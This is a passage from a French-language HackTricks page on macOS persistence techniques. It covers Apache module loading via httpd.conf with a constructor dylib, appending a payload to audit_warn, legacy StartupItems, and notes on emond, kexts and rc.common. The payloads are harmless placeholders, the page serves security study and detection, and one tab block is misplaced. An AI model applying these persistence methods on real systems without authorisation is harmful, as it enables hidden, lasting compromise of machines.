* Contournement de TCC: [🔴](https://emojipedia.org/large-red-circle)
* Httpd n'a pas d'attributs

#### Emplacement

* **`/etc/apache2/httpd.conf`**
* Root requis
* Déclencheur : Lorsque Apache2 est démarré

#### Description & Exploit

Vous pouvez indiquer dans `/etc/apache2/httpd.conf` de charger un module en ajoutant une ligne comme suit:

{% code overflow="wrap" %}
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

De cette façon, vos modules compilés seront chargés par Apache. La seule condition est que vous deviez **le signer avec un certificat Apple valide**, ou vous deviez **ajouter un nouveau certificat de confiance** dans le système et **le signer** avec celui-ci.

Ensuite, si nécessaire, pour vous assurer que le serveur sera démarré, vous pourriez exécuter :
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Exemple de code pour le Dylb :
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### Cadre d'audit BSM

Writeup: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* Utile pour contourner le bac à sable : [🟠](https://emojipedia.org/large-orange-circle)
* Mais vous devez être root, auditd doit être en cours d'exécution et provoquer un avertissement
* Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

* **`/etc/security/audit_warn`**
* Root requis
* **Déclencheur** : Lorsque auditd détecte un avertissement

#### Description & Exploit

Chaque fois qu'auditd détecte un avertissement, le script **`/etc/security/audit_warn`** est **exécuté**. Vous pourriez donc y ajouter votre charge utile.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
### Éléments de démarrage

{% hint style="danger" %}
**Ceci est obsolète, donc rien ne devrait être trouvé dans ces répertoires.**
{% endhint %}

Le **StartupItem** est un répertoire qui devrait être positionné soit dans `/Library/StartupItems/` ou `/System/Library/StartupItems/`. Une fois ce répertoire établi, il doit contenir deux fichiers spécifiques :

1. Un **script rc** : Un script shell exécuté au démarrage.
2. Un fichier **plist**, nommé spécifiquement `StartupParameters.plist`, qui contient divers paramètres de configuration.

Assurez-vous que le script rc et le fichier `StartupParameters.plist` sont correctement placés à l'intérieur du répertoire **StartupItem** pour que le processus de démarrage les reconnaisse et les utilise.

{% tabs %}
{% tab title="StartupParameters.plist" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% endtab %}

{% tab title="superservicename" %} 

### Emplacements de démarrage automatique macOS

Les emplacements suivants sont des endroits où des programmes peuvent être configurés pour démarrer automatiquement au démarrage de macOS :

1. **Dossiers de démarrage automatique :**
   - `/Library/LaunchAgents`
   - `/Library/LaunchDaemons`
   - `/Library/StartupItems`
   - `/System/Library/LaunchAgents`
   - `/System/Library/LaunchDaemons`
   - `/System/Library/StartupItems`
   - `/Users/<username>/Library/LaunchAgents`
   - `/Users/<username>/Library/LaunchDaemons`

2. **Autres emplacements :**
   - `crontab`
   - `launchd`
   - `login items`

Assurez-vous de vérifier ces emplacements pour détecter et gérer les programmes indésirables configurés pour démarrer automatiquement sur votre système macOS. 

{% endtab %}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{% endtab %}
{% endtabs %}

### ~~emond~~

{% hint style="danger" %}
Je ne trouve pas ce composant dans mon macOS, pour plus d'informations consultez le writeup
{% endhint %}

Writeup: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

Introduit par Apple, **emond** est un mécanisme de journalisation qui semble être sous-développé ou peut-être abandonné, mais reste accessible. Bien que peu bénéfique pour un administrateur Mac, ce service obscur pourrait servir de méthode de persistance subtile pour les acteurs de menace, probablement inaperçue par la plupart des administrateurs macOS.

Pour ceux qui sont conscients de son existence, identifier toute utilisation malveillante de **emond** est simple. Le LaunchDaemon du système pour ce service recherche des scripts à exécuter dans un seul répertoire. Pour inspecter cela, la commande suivante peut être utilisée :
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### Emplacement

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* Nécessite les droits d'administrateur
* **Déclencheur**: Avec XQuartz

#### Description & Exploit

XQuartz n'est **plus installé dans macOS**, donc si vous voulez plus d'informations, consultez le writeup.

### ~~kext~~

{% hint style="danger" %}
Il est tellement compliqué d'installer un kext même en tant qu'administrateur que je ne considérerai pas cela comme une échappatoire des sandbox ou même pour la persistance (à moins que vous ayez une faille d'exploitation)
{% endhint %}

#### Emplacement

Pour installer un KEXT en tant qu'élément de démarrage, il doit être **installé dans l'un des emplacements suivants**:

* `/System/Library/Extensions`
* Fichiers KEXT intégrés au système d'exploitation OS X.
* `/Library/Extensions`
* Fichiers KEXT installés par des logiciels tiers

Vous pouvez lister les fichiers kext actuellement chargés avec:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Pour plus d'informations sur [**les extensions de noyau, consultez cette section**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).

### ~~amstoold~~

Writeup : [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### Emplacement

* **`/usr/local/bin/amstoold`**
* Nécessite les droits d'administration

#### Description & Exploitation

Apparemment, le `plist` de `/System/Library/LaunchAgents/com.apple.amstoold.plist` utilisait ce binaire tout en exposant un service XPC... le problème est que le binaire n'existait pas, donc vous pouviez y placer quelque chose et lorsque le service XPC était appelé, votre binaire serait exécuté.

Je ne trouve plus cela dans mon macOS.

### ~~xsanctl~~

Writeup : [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### Emplacement

* **`/Library/Preferences/Xsan/.xsanrc`**
* Nécessite les droits d'administration
* **Déclencheur** : Lorsque le service est exécuté (rarement)

#### Description & exploitation

Apparemment, il n'est pas très courant d'exécuter ce script et je ne l'ai même pas trouvé dans mon macOS, donc si vous voulez plus d'informations, consultez le writeup.

### ~~/etc/rc.common~~

{% hint style="danger" %}
**Cela ne fonctionne pas dans les versions récentes de MacOS**
{% endhint %}

Il est également possible de placer ici **des commandes qui seront exécutées au démarrage.** Exemple de script rc.common régulier :
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Techniques et outils de persistance

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>
{% endhint %}
